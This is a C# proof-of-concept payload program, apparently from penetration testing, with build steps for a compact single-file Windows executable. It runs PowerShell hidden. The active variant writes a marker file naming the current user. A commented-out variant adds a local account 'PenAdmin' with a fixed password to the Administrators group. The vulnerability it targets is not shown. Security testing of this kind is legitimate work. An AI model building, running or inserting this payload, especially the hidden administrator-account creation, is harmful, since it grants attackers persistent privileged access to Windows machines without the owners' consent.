// See https://aka.ms/new-console-template for more information

using System;
using System.Diagnostics;
class Program
{
    static void Main()
    {
        ProcessStartInfo psi = new ProcessStartInfo
        {

            //Compile  using steps:
            // dotnet new console -n RunPoc
            // cd .\RunPoc\
            // modify program.cs with this code
            // dotnet build
            // dotnet publish -c Release -r win-x64 --self-contained true  /p:PublishSingleFile=true /p:PublishTrimmed=true /p:EnableCompressionInSingleFile=true
            // grab exe in \poc\RunPoc\bin\Release\net10.0\win-x64\publish


            //POC_1
            FileName = "powershell.exe",
            Arguments = "-command \"echo \\\"This file is written by $env:userdomain\\$env:username\\\" >C:\\ProgramData\\test.txt\"",
            //POC_2
            //FileName = "powershell.exe",
            //Arguments = "-command \"net user PenAdmin 'test123123' /add; net localgroup Administrators PenAdmin /add\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = new Process())
        {
            process.StartInfo = psi;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            process.WaitForExit();

            Console.WriteLine("=== OUTPUT ===");
            Console.WriteLine(output);

            if (!string.IsNullOrEmpty(error))
            {
                Console.WriteLine("=== ERROR ===");
                Console.WriteLine(error);
            }
        }
    }
}